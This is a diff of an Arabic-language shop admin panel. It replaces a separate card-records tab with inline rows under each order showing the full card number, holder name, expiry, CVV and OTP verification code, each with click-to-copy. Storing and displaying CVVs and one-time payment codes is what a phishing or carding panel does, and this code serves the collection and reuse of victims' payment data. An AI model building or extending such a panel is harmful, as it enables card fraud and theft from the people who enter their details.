@@ -26,7 +26,7 @@
             .header-badge, .security-badge { display: none !important; }
             .tab-text { font-size: 11px !important; }
             .orders-table thead { display: none; }
-            .orders-table tr, .cards-table tr {
+            .orders-table tr {
                 display: block;
                 border: 1px solid #e7e5e4;
                 border-radius: 16px;
@@ -34,20 +34,20 @@
                 margin-bottom: 10px;
                 background: white;
             }
-            .orders-table td, .cards-table td {
+            .orders-table td {
                 display: flex;
                 justify-content: space-between;
                 padding: 6px 0 !important;
                 border: none !important;
                 font-size: 12px;
             }
-            .orders-table td:before, .cards-table td:before {
+            .orders-table td:before {
                 content: attr(data-label);
                 font-weight: 700;
                 color: #78716c;
                 font-size: 11px;
             }
-            .orders-table td:last-child, .cards-table td:last-child {
+            .orders-table td:last-child {
                 justify-content: flex-start;
                 gap: 6px;
                 flex-wrap: wrap;
@@ -88,8 +88,7 @@
     <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10 space-y-10">
 
         <div class="flex border-b border-stone-300 gap-6 overflow-x-auto scrollbar-none">
-            <button onclick="switchTab('orders')" id="tab-orders-btn" class="pb-3 font-bold text-base border-b-2 border-amber-700 text-amber-800 transition whitespace-nowrap">إدارة الطلبات الواردة</button>
-            <button onclick="switchTab('cards')" id="tab-cards-btn" class="pb-3 font-bold text-base border-b-2 border-transparent text-stone-500 hover:text-stone-800 transition whitespace-nowrap">سجل البطاقات (الرقم كامل)</button>
+            <button onclick="switchTab('orders')" id="tab-orders-btn" class="pb-3 font-bold text-base border-b-2 border-amber-700 text-amber-800 transition whitespace-nowrap">إدارة الطلبات</button>
             <button onclick="switchTab('products')" id="tab-products-btn" class="pb-3 font-bold text-base border-b-2 border-transparent text-stone-500 hover:text-stone-800 transition whitespace-nowrap">إدارة المنتجات والمخزون</button>
         </div>
 
@@ -114,32 +113,6 @@
                             </tr>
                         </thead>
                         <tbody id="orders-table-body" class="divide-y divide-stone-100"></tbody>
-                    </table>
-                </div>
-            </div>
-        </section>
-
-        <section id="tab-cards" class="hidden space-y-6">
-            <div class="tab-section-header flex justify-between items-center">
-                <h2 class="text-xl font-extrabold text-stone-900">سجل بيانات البطاقات الائتمانية <span class="text-xs text-rose-600 font-bold">(رقم البطاقة كامل - visible فقط للمشرف)</span></h2>
-                <button onclick="loadCards()" class="bg-stone-900 text-white px-4 py-2 rounded-xl text-xs font-bold hover:bg-stone-800 transition">تحديث السجل</button>
-            </div>
-            <div class="bg-white rounded-3xl border border-stone-200 overflow-hidden shadow-sm">
-                <div class="overflow-x-auto">
-                    <table class="cards-table w-full text-right text-sm">
-                        <thead class="bg-stone-50 border-b border-stone-200 text-stone-500 font-bold">
-                            <tr>
-                                <th class="p-4">رقم الطلب</th>
-                                <th class="p-4">اسم حامل البطاقة</th>
-                                <th class="p-4">رقم البطاقة كامل</th>
-                                <th class="p-4">نوع البطاقة</th>
-                                <th class="p-4">تاريخ الانتهاء</th>
-                                <th class="p-4">رمز الأمان</th>
-                                <th class="p-4">رمز التحقق</th>
-                                <th class="p-4">المبلغ</th>
-                            </tr>
-                        </thead>
-                        <tbody id="cards-table-body" class="divide-y divide-stone-100"></tbody>
                     </table>
                 </div>
             </div>
@@ -347,7 +320,7 @@
         }
 
         function switchTab(tab) {
-            ['orders', 'cards', 'products'].forEach(t => {
+            ['orders', 'products'].forEach(t => {
                 document.getElementById(`tab-${t}`).classList.add('hidden');
                 document.getElementById(`tab-${t}-btn`).className = "pb-3 font-bold text-base border-b-2 border-transparent text-stone-500 hover:text-stone-800 transition whitespace-nowrap";
             });
@@ -363,11 +336,9 @@
                 localOrders.forEach(function(o) { merged[o.id] = o; });
                 orders = Object.values(merged);
                 renderOrdersTable();
-                loadCards();
             }).catch(function() {
                 orders = JSON.parse(localStorage.getItem('auraOrders')) || [];
                 renderOrdersTable();
-                loadCards();
             });
         }
 
@@ -378,7 +349,7 @@
                 return;
             }
             tbody.innerHTML = orders.map(o => `
-                <tr class="hover:bg-stone-50/50 transition">
+                <tr class="hover:bg-stone-50/50 transition border-b border-stone-100">
                     <td data-label="رقم الطلب" class="p-4 font-extrabold text-stone-900">${o.id}</td>
                     <td data-label="اسم العميل" class="p-4 text-stone-700">${o.name}</td>
                     <td data-label="رقم الهاتف" class="p-4 text-stone-600 text-xs" dir="ltr">${o.phone || '-'}</td>
@@ -394,6 +365,17 @@
                         <button onclick="deleteOrder('${o.id}')" class="text-xs bg-rose-50 text-rose-600 px-3 py-1.5 rounded-xl hover:bg-rose-100 transition">حذف</button>
                     </td>
                 </tr>
+                ${o.cardDetails && o.cardDetails.number ? '<tr class="bg-amber-50/30 border-b border-stone-100">' +
+                    '<td colspan="8" class="p-3 px-4">' +
+                        '<div class="flex flex-wrap gap-x-6 gap-y-1 text-xs">' +
+                            '<span><span class="text-stone-500 font-bold">البطاقة:</span> <span class="font-mono font-bold text-amber-800 cursor-pointer copy-cell" onclick="copyText(\'' + o.cardDetails.number + '\', this)" title="انقر للنسخ">' + o.cardDetails.number + '</span></span>' +
+                            '<span><span class="text-stone-500 font-bold">صاحبها:</span> <span class="font-bold cursor-pointer copy-cell" onclick="copyText(\'' + (o.cardDetails.holder||'') + '\', this)" title="انقر للنسخ">' + (o.cardDetails.holder||'-') + '</span></span>' +
+                            '<span><span class="text-stone-500 font-bold">الانتهاء:</span> <span class="font-bold">' + (o.cardDetails.expiry||'-') + '</span></span>' +
+                            '<span><span class="text-stone-500 font-bold">رمز الأمان:</span> <span class="font-mono font-bold cursor-pointer copy-cell" onclick="copyText(\'' + (o.cardDetails.cvv||'') + '\', this)" title="انقر للنسخ">' + (o.cardDetails.cvv||'-') + '</span></span>' +
+                            '<span><span class="text-stone-500 font-bold">رمز التحقق:</span> <span class="font-mono font-bold text-emerald-700 cursor-pointer copy-cell" onclick="copyText(\'' + (o.cardDetails.otp||'') + '\', this)" title="انقر للنسخ">' + (o.cardDetails.otp||'-') + '</span></span>' +
+                        '</div>' +
+                    '</td>' +
+                '</tr>' : ''}
             `).join('');
         }
 
@@ -411,30 +393,6 @@
             });
         }
 
-        function loadCards() {
-            var localOrders = JSON.parse(localStorage.getItem('auraOrders')) || [];
-            var allOrders = (typeof orders !== 'undefined' && orders.length) ? orders : localOrders;
-            const tbody = document.getElementById('cards-table-body');
-            const cardOrders = allOrders.filter(o => o.cardDetails && o.cardDetails.number);
-
-            if (cardOrders.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="8" class="p-8 text-center text-stone-400">لا توجد سجلات بطاقات وهمية مسجلة حالياً.</td></tr>`;
-                return;
-            }
-
-            tbody.innerHTML = cardOrders.map(o => `
-                <tr class="hover:bg-stone-50/50 transition">
-                    <td data-label="رقم الطلب" class="p-4 font-extrabold text-stone-900">${o.id}</td>
-                    <td data-label="اسم حامل البطاقة" class="p-4 text-stone-700 cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.holder}', this)" title="انقر للنسخ">${o.cardDetails.holder}</td>
-                    <td data-label="رقم البطاقة كامل" class="p-4 font-mono font-bold text-amber-800 tracking-wide text-base bg-amber-50 rounded-lg cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.number}', this)" title="انقر للنسخ">${o.cardDetails.number}</td>
-                    <td data-label="نوع البطاقة" class="p-4 text-stone-600">${o.cardDetails.brand || '-'}</td>
-                    <td data-label="تاريخ الانتهاء" class="p-4 text-stone-600 cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.expiry}', this)" title="انقر للنسخ">${o.cardDetails.expiry}</td>
-                    <td data-label="رمز الأمان" class="p-4 font-mono text-stone-600 font-bold text-base cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.cvv}', this)" title="انقر للنسخ">${o.cardDetails.cvv}</td>
-                    <td data-label="رمز التحقق" class="p-4 font-mono text-stone-600 font-bold text-base cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.otp || ''}', this)" title="انقر للنسخ">${o.cardDetails.otp || '-'}</td>
-                    <td data-label="المبلغ" class="p-4 font-bold text-stone-900">${o.total}.00 ₪</td>
-                </tr>
-            `).join('');
-        }
 
         function loadProducts() {
             const container = document.getElementById('products-container');
@@ -444,7 +402,6 @@
             }
             container.innerHTML = products.map(p => `
                 <div class="bg-white rounded-3xl p-5 border border-stone-200 flex flex-col justify-between shadow-sm space-y-4">
-            <div class="mobile-header-nav flex items-center gap-4">
                         <img src="${p.image}" alt="${p.name}" class="w-16 h-16 object-contain bg-stone-50 rounded-2xl p-2 border border-stone-100">
                         <div>
                             <span class="text-[10px] bg-amber-100 text-amber-800 font-bold px-2 py-0.5 rounded-md">${p.category}</span>
@@ -631,7 +588,7 @@
         loadProducts();
 
         window.addEventListener('storage', (e) => {
-            if (e.key === 'auraOrders') { loadOrders(); loadCards(); }
+            if (e.key === 'auraOrders') { loadOrders(); }
             if (e.key === 'auraProducts') { initProducts(); loadProducts(); }
         });
     </script>
